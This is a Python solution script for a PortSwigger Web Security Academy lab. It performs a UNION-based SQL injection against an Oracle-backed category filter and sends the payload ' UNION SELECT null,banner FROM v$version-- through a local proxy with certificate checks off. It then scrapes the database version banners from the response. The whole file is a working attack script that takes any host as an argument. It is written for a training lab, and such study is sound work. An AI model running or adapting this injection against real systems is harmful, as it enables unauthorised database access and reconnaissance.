#!/usr/bin/env python3
# Lab: SQL injection attack, querying the database type and version on Oracle
# Lab-Link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle>
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import re
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit(host, category):
    url = f'{host}/filter?category={category}'
    payload = "' UNION SELECT null,banner FROM v$version--"
    requests.get(f'{url}{payload}', verify=False, proxies=proxies)

    # I had some issues getting the 'congratulations' banner.
    # So wait a bit and re-get it
    time.sleep(2)

    # Parse this second request for the print out, otherwise the
    # lab hint will be found as well
    r2 = requests.get(f'{url}{payload}', verify=False, proxies=proxies)
    res = r2.text
    if 'Congratulations, you solved the lab' in res:
        print(f"[+] Dumping version information:")
        soup = BeautifulSoup(res, 'html.parser')
        print(f"[+]   {soup.find(text = re.compile('CORE'))}")
        print(f"[+]   {soup.find(text = re.compile('NLSRTL'))}")
        print(f"[+]   {soup.find(text = re.compile('Oracle Database'))}")
        print(f"[+]   {soup.find(text = re.compile('PL/SQL'))}")
        print(f"[+]   {soup.find(text = re.compile('TNS'))}")
        return True
    return False


if __name__ == "__main__":
    print('[+] SQL injection attack, querying the database type and version on Oracle')
    try:
        host = sys.argv[1].strip().rstrip('/')
        # category = sys.argv[2].strip()
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    category = "notRelevant"

    if exploit(host, category):
        print('[+] Injection successful')
    else:
        print('[-] Injection not successful')
